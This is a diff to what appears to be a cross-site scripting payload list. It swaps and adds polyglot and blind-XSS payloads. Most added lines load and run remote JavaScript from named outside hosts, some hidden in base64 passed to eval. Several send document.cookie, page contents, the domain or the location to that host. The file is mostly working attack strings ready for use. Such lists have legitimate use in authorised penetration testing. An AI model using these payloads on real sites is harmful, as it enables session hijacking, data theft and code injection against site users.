@@ -1,5 +1,7 @@
-JavaScript://%250A/*?'/*\'/*"/*\"/*`/*\`/*%26apos;)/*<!--></Title/</Style/</Script/</textArea/</iFrame/</noScript>\74k<K/contentEditable/autoFocus/OnFocus=/*${/*/;{/**/(confirm)(1)}//><Base/Href=//X55.is\76-->
-JavaScript://%250A/*?'/*\'/*"/*\"/*`/*\`/*%26apos;)/*<!--></Title/</h1/</h2/</h3/</h4/</div/</p/</a/</font/</label/</button/</img/</ul/</ol/</li/</option/</span/</Style/</Script/</textArea/</iFrame/</noScript>\74k<K/contentEditable/autoFocus/OnFocus=/*${/*/;{/**/(confirm)(1)}//><Base/Href=//X55.is\76-->
+JavaScript://%250A/*?'/*\'/*"/*\"/*`/*\`/*%26apos;)/*<!--></Title/</h1/</h2/</h3/</h4/</div/</p/</a/</font/</label/</button/</img/</ul/</ol/</li/</option/</span/</Style/</Script/</textArea/</iFrame/</noScript>\74k<K/contentEditable/autoFocus/OnFocus=/*${/*/;{/**/(confirm)(1)}//><Base/Href=//rix4uni.ez.pe-->
+JavaScript://%250A/*?'/*\'/*"/*\"/*`/*\`/*%26apos;)/*<!--></Script/</textArea/</iFrame/</noScript>\74k<K/contentEditable/autoFocus/OnFocus=/*${/*/;{/**/(confirm)(1)}//><Base/Href=//rix4uni.ez.pe-->
+'"<!-->)</Title/</h1/</h2/</h3/</h4/</div/</p/</a/</font/</label/</button/</img/</ul/</ol/</li/</option/</span/</Style/</Script/</textArea/</iFrame/</noScript><Img Src=OnXSS OnError=(confirm)(1)>
+'"<!-->)</Title/</h1/</h2/</h3/</h4/</div/</p/</a/</font/</label/</button/</img/</ul/</ol/</li/</option/</span/</Style/</Script/</textArea/</iFrame/</noScript><Img Src=OnXSS OnError=&#x63;onfir\u006d`1`>
 1'/confirm?.(1)/'
 1')"AutoFocus/ContentEditable/OnFocusIn=(confirm)(1)//
 001'-confirm`K`-'=1
@@ -30,13 +32,49 @@ JavaScript://%250A/*?'/*\'/*"/*\"/*`/*\`/*%26apos;)/*<!--></Title/</h1/</h2/</h3
 1')"AutoFocus/ContentEditable/On%0CFocusIn=(conf%0Cirm)(1)//
 1'"--><Img/Src/OnError=(confirm)(1)//<!--
 1</Script/><Img/Src/OnError%3Dconfirm?.(1)>
-<Script/Src=//jxss.netlify.app/10.js></Script>
-<img src="x" onerror="import('//jxss.netlify.app/10.js')">
-<img src="x" onload="import('//jxss.netlify.app/10.js')">
-<svg/onload=import('//jxss.netlify.app/10.js')>
-<img/onerror=import('//jxss.netlify.app/10.js')>
-<img/onload=import('//jxss.netlify.app/10.js')>
-<img src=//jxss.netlify.app/10.js OnLoad=import(src)>
-<Img Src=//jxss.netlify.app/1.js OnLoad%0C=import(Src)//
-<img src=x onerror=(alert)(1)||alert(2)||al\u0065rt(3)>
-<img src=x onerror=(alert)(1)&&alert(2)&&al\u0065rt(3)>
+')"--><Script/Src=//xss.krazeplanet.com/10.js></Script>
+')"--><img src="x" onerror="import('//xss.krazeplanet.com/10.js')">
+')"--><img src="x" onload="import('//xss.krazeplanet.com/10.js')">
+')"--><svg/onload=import('//xss.krazeplanet.com/10.js')>
+')"--><img/onerror=import('//xss.krazeplanet.com/10.js')>
+')"--><img/onload=import('//xss.krazeplanet.com/10.js')>
+')"--><img src=//xss.krazeplanet.com/10.js OnLoad=import(src)>
+')"--><Img Src=//xss.krazeplanet.com/1.js OnLoad%0C=import(Src)//
+')"--><img src=x onerror=(alert)(1)||alert(2)||al\u0065rt(3)>
+')"--><img src=x onerror=(alert)(1)&&alert(2)&&al\u0065rt(3)>
+"><script/src=//rix4uni.ez.pe></script>"@x.com
+"><img/src/onerror=import('//rix4uni.ez.pe')>"@x.com
+013371337;ext=<img/src/onerror=import('//rix4uni.ez.pe')>
+`â€™"><script src=//rix4uni.ez.pe></script>
+`'"></script></title></textarea><script src=//rix4uni.ez.pe></script>
+--></tiTle></stYle></texTarea></scrIpt>"//'//><scrIpt src="https://rix4uni.ez.pe"></scrIpt>
+`'"></Title/</StYle/</TeXtarEa/</ScRipt/</NoScRiPt/</SeLeCt/</OpTiOn/</Svg/''"><svg/onload=javascript:eval(atob('dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vcml4NHVuaS5lei5wZSI7ZG9jdW1lbnQuYm9keS5hcHBlbmQoYSk7'))//
+`â€™"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vcml4NHVuaS5lei5wZSI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs= onerror=eval(atob(this.id))>
+`â€™"><input onfocus=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vcml4NHVuaS5lei5wZSI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs= autofocus>
+javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html "onmouseover=/*<svg*/onload=import(/https:\rix4uni.ez.pe\/.source)//>
+`â€™"><svg onload="javascript:eval('var a=document.createElement(\'script\');a.src=\'https://rix4uni.ez.pe\';document.body.appendChild(a)')" />
+`â€™"><iframe src="javascript:var a=document.createElement('script');a.src='https://rix4uni.ez.pe';document.body.appendChild(a)"></iframe>
+`â€™"><div onmouseover="var a=document.createElement('script');a.src='https://rix4uni.ez.pe';document.body.appendChild(a)">Hover me</div>
+`â€™"><audio src="x" onerror="var a=document.createElement('script');a.src='https://rix4uni.ez.pe';document.body.appendChild(a)">
+`â€™"><body onload="var a=document.createElement('script');a.src='https://rix4uni.ez.pe';document.body.appendChild(a)">
+<script>fetch("//rix4uni.ez.pe").then(r=>r.text()).then(t=>eval(t))</script>
+<iframe srcdoc="<script src='https://rix4uni.ez.pe'></script>"></iframe>
+<video><source onerror="eval(atob('dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vcml4NHVuaS5lei5wZSI7ZG9jdW1lbnQuYm9keS5hcHBlbmQoYSk7'))">
+<details open ontoggle="eval(atob('dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vcml4NHVuaS5lei5wZSI7ZG9jdW1lbnQuYm9keS5hcHBlbmQoYSk7'))">
+<svg><desc><![CDATA[</desc><script src="https://rix4uni.ez.pe"></script>]]></svg>
+<style>@import url(https://rix4uni.ez.pe);</style>
+<math href="javascript:eval(atob('dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vcml4NHVuaS5lei5wZSI7ZG9jdW1lbnQuYm9keS5hcHBlbmQoYSk7'))"></math>
+<svg><foreignObject><iframe srcdoc="<script src='https://rix4uni.ez.pe'></script>"></iframe></foreignObject></svg>
+<input autofocus onfocus="new Image().src='https://rix4uni.ez.pe/?c='+document.cookie">
+<input id='x' onfocus=eval(atob(this.id)) autofocus id=dmVyIGM9bmV3IEltYWdlKCk7Yy5zcmM9J2h0dHBzOi8vcml4NHVuaS5lei5wZS8/Yz0nK2RvY3VtZW50LmNvb2tpZTs=>
+<textarea autofocus onfocus="location='https://rix4uni.ez.pe/?txt='+document.body.innerHTML"></textarea>
+<img src="x" onerror="new Image().src='https://rix4uni.ez.pe/?e='+document.domain">
+<div contenteditable onfocus="fetch('https://rix4uni.ez.pe/?x='+document.location)"></div>
+<svg><a xlink:href="https://rix4uni.ez.pe"><rect onfocus="this.href.baseVal='https://rix4uni.ez.pe?svgfocus='+document.domain" tabindex="1"/></a></svg>
+<iframe src="javascript:parent.location='https://rix4uni.ez.pe?frame='+document.domain"></iframe>
+<video src onerror="fetch('https://rix4uni.ez.pe?videofail='+document.cookie)"></video>
+<details open ontoggle="new Image().src='https://rix4uni.ez.pe?toggle='+document.cookie"></details>
+<marquee onstart="fetch('https://rix4uni.ez.pe?marquee='+document.cookie)">BLIND XSS</marquee>
+/*iframe/src*/<iframe/src="<iframe/src=@"/onload=document.body.appendChild(document.createElement('script')).src='https://rix4uni.ez.pe' /*iframe/src*/>
+1')"AutoFocus/ContentEditable/OnFocusIn=(document.body.appendChild(document.createElement('script')).src='https://rix4uni.ez.pe')//
+">><marquee><img src=x onerror=document.body.appendChild(document.createElement('script')).src='https://rix4uni.ez.pe'></marquee> ></plaintext\></|\><plaintext/onmouseover=document.body.appendChild(document.createElement('script')).src='https://rix4uni.ez.pe'>
